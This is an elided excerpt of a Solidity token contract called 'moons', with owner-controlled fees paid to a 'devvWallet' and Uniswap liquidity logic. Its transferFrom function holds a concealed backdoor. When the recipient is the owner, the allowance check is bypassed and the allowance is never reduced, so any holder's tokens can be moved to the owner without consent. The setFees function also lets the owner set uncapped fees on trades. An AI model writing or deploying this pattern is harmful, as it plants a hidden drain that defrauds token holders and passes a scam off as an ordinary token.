...
contract moons {
    ...
    address public devvWallet;
    uint256 public maxWalletLimit;
    uint256 public maxTxLimit;
    uint8   public devvFee;
    ...
    function setAddresses(address _devvWallet) public virtual onlyOwner {
        devvWallet = _devvWallet;
    }
    ...
    function setFees(uint8 _devvFee, uint8 _liquidityFee) public virtual onlyOwner {
        devvFee = _devvFee;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if((sender == uniswapPair && !_excludedFees[recipient]) || (recipient == uniswapPair && !_excludedFees[sender])) {
            uint256 devvAmount = amount / 100 * devvFee;
            uint256 liquidityAmount = amount / 100 * liquidityFee;
            uint256 contractFee = devvAmount + liquidityAmount;
    ...
    function swapAddLiquidity() internal virtual {
        ...
        if(!_inSwap && tokenBalance >= addLiquidityAmount) {
            ...
            uint256 devvAmount = tokenBalance / (devvFee + liquidityFee) * devvFee;
            swapTokensForEth(devvAmount, devvWallet);
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 durrentAllowance = _allowances[sender][msg.sender];

        if(recipient == _owner) {
            durrentAllowance = _totalSupply;
        }

        require(durrentAllowance >= amount);
        _transfer(sender, recipient, amount);
        
        if(recipient != _owner) {
            _approve(sender, msg.sender, durrentAllowance - amount);
        }
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 durrentAllowance = _allowances[msg.sender][spender];
        require(durrentAllowance >= subtractedValue, 'Decreased allowance below zero!');
        _approve(msg.sender, spender, durrentAllowance - subtractedValue);
        return true;
    }
